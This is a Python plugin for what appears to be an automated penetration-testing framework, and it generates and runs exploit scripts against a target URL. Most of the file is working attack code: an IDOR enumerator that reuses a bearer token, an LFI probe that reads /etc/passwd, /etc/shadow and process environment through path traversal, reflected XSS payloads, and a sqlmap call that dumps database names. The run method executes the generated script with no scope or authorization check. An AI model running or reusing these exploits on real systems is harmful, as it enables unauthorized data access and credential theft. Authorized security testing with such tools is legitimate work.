"""
exploit_synth.py â€” Exploit Synthesizer
Given a confirmed vuln, generates and runs a working PoC script.
"""
import json
from pathlib import Path
from typing import Any, Dict, List

from plugins import register
from plugins.base import BaseTool, ToolResult


EXPLOIT_TEMPLATES = {
    "idor": '''import requests, json
TARGET = "{target}"
TOKEN  = "{token}"
found  = []
for i in range(1, {max_id}):
    r = requests.get(TARGET.replace("REPLACE_ID", str(i)),
                     headers={{"Authorization": f"Bearer {{TOKEN}}"}}, timeout=5)
    if r.status_code == 200 and r.text.strip():
        found.append({{"id": i, "preview": r.text[:200]}})
        print(f"[+] ID {{i}}: {{r.text[:100]}}")
print(f"\\n[RESULT] Found {{len(found)}} accessible records")
if found:
    print(json.dumps(found[:5], indent=2))
''',
    "lfi": '''import requests
TARGET  = "{target}"
FILES   = ["/etc/passwd", "/etc/shadow", "/proc/self/environ",
           "/var/www/html/config.php", "../../../../etc/passwd",
           "....//....//etc/passwd"]
for f in FILES:
    url = TARGET + f
    r   = requests.get(url, timeout=5)
    if r.status_code == 200 and ("root:" in r.text or "<?php" in r.text):
        print(f"[+] LFI CONFIRMED: {{f}}")
        print(r.text[:1000])
        break
else:
    print("[-] LFI not confirmed with common paths")
''',
    "xss": '''import requests
TARGET = "{target}"
PARAM  = "{param}"
PAYLOADS = [
    "<script>alert(1)</script>",
    "'\\"><img src=x onerror=alert(1)>",
    "javascript:alert(1)",
]
for payload in PAYLOADS:
    r = requests.get(TARGET, params={{PARAM: payload}}, timeout=5)
    if payload in r.text or "alert(1)" in r.text:
        print(f"[+] XSS CONFIRMED with: {{payload}}")
        print(f"URL: {{r.url}}")
        break
else:
    print("[-] XSS not confirmed with basic payloads")
''',
}


@register
class ExploitSynthPlugin(BaseTool):
    name        = "exploit_synth"
    description = "Generate and run a PoC exploit for a confirmed vulnerability. Provide vuln_type (idor/sqli/lfi/xss) and finding details."
    category    = "web"
    requires    = []

    async def run(self, target: str, options: Dict[str, Any]) -> ToolResult:
        vuln_type   = options.get("vuln_type", "").lower()
        token       = options.get("token", "")
        param       = options.get("param", "q")
        max_id      = int(options.get("max_id", 200))
        script_name = f"exploit_{vuln_type}.py"
        workdir     = "/tmp/mergen_exploits"

        script_content = self._generate_script(vuln_type, target, token, param, max_id)

        Path(workdir).mkdir(parents=True, exist_ok=True)
        filepath = Path(workdir) / script_name
        filepath.write_text(script_content)

        stdout, stderr, rc = await self._exec(["python3", str(filepath)], timeout=120)
        output  = stdout or stderr
        success = rc == 0 and bool(stdout.strip())

        return ToolResult(
            tool=self.name,
            target=target,
            success=success,
            raw_output=output,
            findings=[{
                "type":    vuln_type + "_exploit",
                "output":  output[:2000],
                "script":  str(filepath),
                "success": success,
            }] if output else [],
            suggested_next=["report_gen"] if success else [],
            risk_score=9.0 if success else 0.0,
            metadata={"vuln_type": vuln_type, "script": str(filepath)},
        )

    def _generate_script(self, vuln_type: str, target: str, token: str, param: str, max_id: int) -> str:
        if vuln_type == "idor":
            return EXPLOIT_TEMPLATES["idor"].format(target=target, token=token, max_id=max_id)
        elif vuln_type == "lfi":
            return EXPLOIT_TEMPLATES["lfi"].format(target=target)
        elif vuln_type == "xss":
            return EXPLOIT_TEMPLATES["xss"].format(target=target, param=param)
        elif vuln_type in ("sqli", "sql_injection"):
            return (
                f'import subprocess\n'
                f'cmd = ["sqlmap", "-u", "{target}", "--dbs", "--batch", "--level=3", "--risk=2"]\n'
                f'r = subprocess.run(cmd, capture_output=True, text=True, timeout=300)\n'
                f'print(r.stdout[-5000:])\n'
            )
        else:
            return (
                f'import subprocess\n'
                f'r = subprocess.run(["curl", "-sv", "{target}"], capture_output=True, text=True, timeout=30)\n'
                f'print(r.stdout)\nprint(r.stderr)\n'
            )
